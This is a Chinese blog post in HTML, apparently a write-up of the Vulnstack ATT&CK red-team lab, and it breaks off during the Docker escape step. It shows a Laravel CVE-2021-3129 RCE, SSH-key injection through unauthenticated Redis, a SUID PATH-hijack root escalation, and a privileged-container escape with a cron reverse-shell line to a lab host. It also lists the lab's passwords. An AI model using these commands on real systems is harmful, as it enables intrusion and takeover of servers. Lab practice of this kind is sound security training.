@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/","path":"2023/12/25/ATT&CK红队评估实战靶场（七）/","title":"ATT&CK红队评估实战靶场（七）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ATT&CK红队评估实战靶场（七） | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE"><span class="nav-text">服务配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-text">域用户信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-text">外网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Laravel-Debug-mode-RCE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">Laravel Debug mode RCE漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-text">Redis未授权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9dockershell"><span class="nav-text">反弹dockershell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker%E6%8F%90%E6%9D%83%E2%80%93%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="nav-text">docker提权–环境变量提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker%E9%80%83%E9%80%B8"><span class="nav-text">docker逃逸</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2021-3493"><span class="nav-text">CVE-2021-3493</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFMSF"><span class="nav-text">上线MSF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F"><span class="nav-text">二层网络渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%90%86-%E8%AE%BF%E9%97%AE-http-%E6%9C%8D%E5%8A%A1"><span class="nav-text">添加代理 访问 http 服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="nav-text">上线msf</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">三层网络信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%8D%E6%9D%83"><span class="nav-text">降权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">域信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-text">抓取密码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F"><span class="nav-text">三层网络渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IPC"><span class="nav-text">$IPC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec-%E5%9F%9F%E6%8E%A7"><span class="nav-text">psexec-域控</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ATT&CK红队评估实战靶场（七） | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ATT&CK红队评估实战靶场（七）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久没打过靶机了，<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">ATT&amp;CK红队评估实战靶场（七）</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//868c417143234dd29ecb57aefdc38e9e.png"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞搜索与利用</p>
+<blockquote>
+<p>Laravel Debug mode RCE（CVE-2021-3129）漏洞利用<br>Docker逃逸<br>通达OA v11.3 漏洞利用<br>Linux环境变量提权<br>Redis 未授权访问漏洞<br>Linux sudo权限提升（CVE-2021-3156）漏洞利用<br>SSH密钥利用<br>Windows NetLogon 域内权限提升（CVE-2020-1472）漏洞利用<br>MS14-068漏洞利用</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>在Vmware中新增两个虚拟网卡VMnet8、VMnet14</p>
+<p>VMnet8设为默认的NAT模式，IP段设为192.168.52.0/24；VMnet14设为仅主机模式，IP段设为192.168.93.0/24</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2fa2a12803644d3ca15fe1049600a71c.png"></p>
+<p>将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网</p>
+<p>攻击机kali：192.168.42.224<br>web1：192.168.42.30</p>
+<h2 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h2><p>DMZ区的 Ubuntu 需要启动nginx服务：</p>
+<blockquote>
+<p>redis-server /etc/redis.conf<br>/usr/sbin/nginx -c /etc/nginx/nginx.conf<br>iptables -F</p>
+</blockquote>
+<p>第二层网络的 Ubuntu需要启动docker容器：</p>
+<blockquote>
+<p>sudo service docker start<br>sudo docker start 8e172820ac78</p>
+</blockquote>
+<p>第三层网络的 Windows 7 （PC 2）需要启动通达OA：</p>
+<blockquote>
+<p>C:\MYOA\bin\AutoConfig.exe</p>
+</blockquote>
+<h2 id="域用户信息"><a href="#域用户信息" class="headerlink" title="域用户信息"></a>域用户信息</h2><p>域用户账户和密码如下：</p>
+<blockquote>
+<p>Administrator：Whoami2021<br>whoami：Whoami2021<br>bunny：Bunny2021<br>moretz：Moretz2021</p>
+</blockquote>
+<blockquote>
+<p>Ubuntu 1：<br>web：web2021</p>
+</blockquote>
+<blockquote>
+<p>Ubuntu 2：<br>ubuntu：ubuntu</p>
+</blockquote>
+<blockquote>
+<p>通达OA账户：<br>admin：admin657260</p>
+</blockquote>
+<h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="Laravel-Debug-mode-RCE漏洞利用"><a href="#Laravel-Debug-mode-RCE漏洞利用" class="headerlink" title="Laravel Debug mode RCE漏洞利用"></a>Laravel Debug mode RCE漏洞利用</h2><p>ip扫描</p>
+<blockquote>
+<p>nmap -T4 -sV -A 192.168.42.30 -p 1-65535</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a8e85f92ac724c6cadfea54a77afec1a.png"><br>开启了 22 80 81 6379端口</p>
+<p>22 ssh端口不说了，80端口是一个博客，没有什么利用点</p>
+<p>访问81端口发现是Laravel框架且版本是 <code>Laravel v8.29.0 (PHP v7.4.14)</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a93ff3e0e06f4fd78602fe62c0ee8cf4.png"></p>
+<p>搜索到漏洞CVE-2021-3129，Exp工具直接打一波</p>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">laravel-CVE-2021-3129-EXP</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b0129f34de1f4828bfe0d651d771dc0b.png"><br>这个shell哥斯拉3.03没连接上可能要使用旧版哥斯拉才能连接，又找到一款写入一句话的工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/1111one/laravel-CVE-2021-3129-EXP">laravel-CVE-2021-3129-EXP</a></p>
+<p>成功getshell</p>
+<p>发现是docker环境</p>
+<blockquote>
+<p>hostname<br>ls -alh /.dockerenv<br>cat /proc/1/cgroup</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1799eaddbfd442999d093acfe1c0f370.png"></p>
+<h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>先上两篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249238.html">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1853008">Redis 常见漏洞利用方法总结 - 云+社区 - 腾讯云 (tencent.com)</a></p>
+<p>还有一个 <code>6379端口</code> 没有测试，要充分发挥所收集到的信息加以利用</p>
+<p>Redis：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//53c749913e7d453f815b44d716644883.png"><br>先安装个客户端</p>
+<blockquote>
+<p>#安装<br>wget <a target="_blank" rel="noopener" href="http://download.redis.io/redis-stable.tar.gz">http://download.redis.io/redis-stable.tar.gz</a><br>tar xvzf redis-stable.tar.gz<br>cd redis-stable<br>make<br>sudo cp src/redis-cli /usr/local/bin/</p>
+</blockquote>
+<p>先尝试连接redis：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d51692c57b2748a89fb4e606eaf3c527.png"><br>连接成功，尝试写ssh 公钥</p>
+<blockquote>
+<p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过<code>修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys</code>，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d9a083f45d1a4bc09126541858e71fa7.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//581cb4f18e1c41cabaf63126b0b4ceeb.png"><br>接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa  &#x2F;&#x2F;主机生成公钥</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; cys.txt  &#x2F;&#x2F;将公钥导入cys.txt文件,避免数据混合用 &#39;\n&#39;</span><br><span class="line"></span><br><span class="line">cat cys.txt | redis-cli -h 192.168.42.30 -p 6379 -x set cys   &#x2F;&#x2F;把cys.txt文件内容写入目标主机的redis缓冲中,key为cys</span><br><span class="line">&#x2F;&#x2F; -x 代表从标准输入读取数据作为该命令的最后一个参数</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c183371ac85c4ad184cd4df45e591748.png"><br>然后，使用攻击机连接目标机器Redis，<code>设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys</code>，并将数据保存在目标服务器硬盘上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh      # 设置redis的备份路径为&#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys     # 设置保存文件名authorized_keys</span><br><span class="line">save        # 将数据保存在目标服务器硬盘上</span><br><span class="line">ssh 192.168.213.188    #连接</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//707e71b107d54c01b85279d11ca9e418.png"><br>攻击机ssh直接连接：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7f735e32a3db4317a973c88c0654a17a.png"></p>
+<p>先看一手IP信息发现两个网段</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d946a70ebdf64a7d99f56cc9fce62faf.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//00bf65081ce34de6b22cf9198a56596e.png"><br>发现nginx服务：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c70a5ff7bd7a48d4a8e875531be06a3c.png"><br>看一下配置文件：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7fdf80c4557c4a5f8eb0f044d3f01222.png"><br>81端口是反代另一个网段的机器的8000端口，结合webshell的docker环境，所以说，web1反代了web2的docker，那么接下来就是利用docker逃逸来控制第二台机器</p>
+<h2 id="反弹dockershell"><a href="#反弹dockershell" class="headerlink" title="反弹dockershell"></a>反弹dockershell</h2><blockquote>
+<p>按说，第二层网络是nat，应该是能访问到kali的，所以这里我能反弹dockers的shell，但是这个师傅说docker不出网，可能是前面的网络配置不同吧</p>
+</blockquote>
+<p>后来想了一下，真实环境中，web2应该处于内网中，肯定不能访问kali，所以将docker的shell反弹到web1上，将web1作为跳板机</p>
+<p>反弹shell的方式也有很多了，bash一句话，msf，python起一个httpserver等</p>
+<p>bash一句话：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cfb2fab357bf41c9a432400a5b2c7ade.png"></p>
+<h2 id="docker提权–环境变量提权"><a href="#docker提权–环境变量提权" class="headerlink" title="docker提权–环境变量提权"></a>docker提权–环境变量提权</h2><p>现在的docker权限是一个www-data，先将权限提升一下</p>
+<p>能想到的是内核提权，但是这里学习到了一个新的方法，环境变量提权</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/173903.html">在Linux中使用环境变量进行提权</a></p>
+<p>这里就必须了解一下 <code>$PATH是个什么</code>：</p>
+<blockquote>
+<p>PATH变量就是用于保存可以搜索的目录路径，如果待运行的程序不在当前目录，操作系统便可以去依次搜索PATH变量变量中记录的目录，如果在这些目录中找到待运行的程序，操作系统便可以运行。PATH的值是一系列目录，<code>echo $PATH</code> 可以显示环境变量</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1cfe46c1d624451da701158de08f3803.png"><br>那么第一步就是先寻找带有SUID的文件,<a target="_blank" rel="noopener" href="http://c.biancheng.net/view/868.html">Linux SetUID（SUID）文件特殊权限用法详解</a></p>
+<blockquote>
+<p>简单来说，对于一个可执行文件，当用户执行此文件时，会以文件所有者的身份去执行此文件，一旦文件执行结束，身份的切换也随之消失</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">-perm -u&#x3D;s : 所有者权限有s权限的目录或文件</span><br><span class="line">-type f  : 文件类型是一般文件</span><br><span class="line">2&gt;&#x2F;dev&#x2F;null : 标准输出错误输入到空(就是错误不显示)</span><br></pre></td></tr></table></figure>
+
+<p>发现一个shell</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//078afd3ceba74f1baeea796defa7566a.png"></p>
+<p>看一下：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//28ba729bfaab4989a43472b17cc12b74.png"></p>
+<p><code>运行ps命令，但是没有使用绝对路径</code></p>
+<p>那么我们尝试更改 <code>$PATH</code> 来执行我们的恶意程序，从而获得目标主机的高权限shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH </span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH # 将&#x2F;tmp添加到环境变量中，并且先加载执行&#x2F;tmp里的程序</span><br><span class="line">cd &#x2F;home&#x2F;jobs</span><br><span class="line">.&#x2F;shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1a98a01b8d47490bba6d728b92e5fec1.png"></p>
+<p><code>个人理解</code>：当运行./shell 时，执行系统命令 ps 这个命令本应该在/usr/bin下执行，但是我们添加了一个<code>同名ps且可执行</code>，并且在 $PATH 中 /tmp 处于最开头，所以 <code>先执行了/tmp下的恶意ps</code>，而且因为./shell的<code>s权限</code>，所以在执行恶意 ps 时会以 root 身份执行</p>
+<p>将docker的root权限一句话反弹到web1，www-data的shell可以扔掉了</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//db03344db2ab447a8d120ff234c699e0.png"></p>
+<h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>毕竟是一个docker环境，肯定要进行逃逸</p>
+<p>那么基本就三种逃逸方式了：</p>
+<blockquote>
+<p>一、由内核漏洞引起 ——Dirty COW(CVE-2016-5195)<br>二、由 Docker 软件设计引起——CVE-2019-5736、CVE-2019-14271<br>三、由配置不当引起——开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能（capabilities）机制、sock通信方式</p>
+</blockquote>
+<p>这里利用特权模式进行逃逸</p>
+<p>原理</p>
+<blockquote>
+<p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。<br>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。<br>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l   &#x2F;&#x2F;查看磁盘文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9da33fe626304021a88df527d876a98c.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;cyshack   &#x2F;&#x2F;创建 cyshack文件夹</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;cyshack   &#x2F;&#x2F;将设备挂载到新目录下</span><br><span class="line">ls &#x2F;cyshack  &#x2F;&#x2F;查看是否挂载成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c2ac3ee03bab4880bfb5839f357852a2.png"><br>挂载成功，写入计划任务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.52.10&#x2F;7002 0&gt;&amp;1&#39; &gt;&gt; &#x2F;cyshack&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br></pre></td></tr></table></figure>
+<p>但是没有响应</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//de878490496c4eb796b61308cc7ec838.png"><br>再次尝试写ssh密钥，发现/cyshack/root下没有.ssh目录</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//8fd3d153c2144cbc9ffd21d1df575126.png"><br>再看一下/cyshack/home/ubuntu\</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//ed4c058436664b95b67985d3b55d44a5.png"><br>那么就往这里写ssh秘钥，这里还是要在web1上进行写ssh</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f cyshack</span><br><span class="line">chmod 600 cyshack</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2b24a9b37581446d90bccf570c3a3169.png"></p>
